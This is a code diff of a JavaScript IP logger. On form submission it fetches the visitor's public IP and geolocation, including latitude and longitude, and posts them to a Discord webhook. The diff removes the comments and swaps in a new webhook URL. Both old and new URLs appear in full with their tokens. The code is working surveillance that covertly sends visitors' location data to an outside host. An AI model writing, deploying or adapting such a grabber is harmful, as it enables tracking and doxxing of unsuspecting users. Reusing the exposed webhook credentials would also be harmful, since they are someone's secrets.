@@ -116,12 +116,12 @@
 
     ipLoggerForm.addEventListener('submit', function(event) {
       event.preventDefault();
-      // Retrieve the IP address using a third-party API
+      
       fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
           const ipAddress = data.ip;
-          // Retrieve additional information about the IP address
+          
           fetch(`https://ipapi.co/${ipAddress}/json/`)
             .then(response => response.json())
             .then(data => {
@@ -135,8 +135,8 @@
                 Latitude: ${data.latitude}
                 Longitude: ${data.longitude}
               `;
-              // Send the IP information to a Discord webhook
-              const webhookUrl = 'https://discord.com/api/webhooks/1286923479635202058/lFx-wk6yQ55dptOq3NzyVBto3A1haJ6tlyGTrDhLVCSiHqCZS6oiMVLzjXc_9hv0T1PO';
+              
+              const webhookUrl = 'https://discord.com/api/webhooks/1302457773342064651/UL4girLSV5LGitYmAmIoAm1GUwjQqW5LkgKob9Sm65RGkOh647xFpuGm6Jsuj63zt8U-';
               const payload = {
                 content: `condom man says:\n${ipInfo}`
               };
